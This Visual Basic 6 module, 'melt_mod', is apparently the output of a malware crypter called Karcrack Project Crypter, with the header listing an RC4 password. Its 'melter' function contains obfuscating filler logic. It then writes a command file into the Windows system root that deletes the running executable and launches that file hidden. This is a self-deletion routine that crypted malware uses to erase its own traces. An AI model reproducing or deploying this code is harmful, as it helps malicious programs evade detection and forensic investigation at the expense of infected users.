Attribute VB_Name = "melt_mod"

'##############################################################
'#Automated encryption code                     #
'#by Karcrack Project Crypter v2.1 [KPC]                  #
'#Program consisting of Karcrack                        #
'#Details of the encryption:                            #
'#	+ Encriptacion  :RC4                                      
'#	+ Contraseña    :qkercipgp
'#	+ L. Encriptacion:0                                        
'#	+ Fecha/Hora    :14:31:03--01/06/2009                     
'##############################################################
Public Function melter()
Dim aaa, bbb, ccc, ddd, eee, fff
If aaa = bbb Then
ccc = "1"
Else
End
End If
If ddd = eee Then
ccc = "0"
Else
End
End If
If ccc = "0" Then
  aaa = "del "
  bbb = Chr(34)
  ccc = App.Path
  ddd = "\"
  eee = App.ExeName
  fff = ".exe"
Else
End
End If
aaa = "del "
  bbb = Chr(34)
  ccc = App.Path
  ddd = "\"
  eee = App.ExeName
  fff = ".exe"
Dim lol As Integer
Open Environ("systemroot") & "xd.cmd" For Output As #1
Print #1, aaa & bbb & ccc & ddd & eee & fff & bbb
Close #1
For lol = 0 To 10000
lol = lol + 1
Next
Shell Environ("systemroot") & "xd.cmd", vbHide
End
End Function

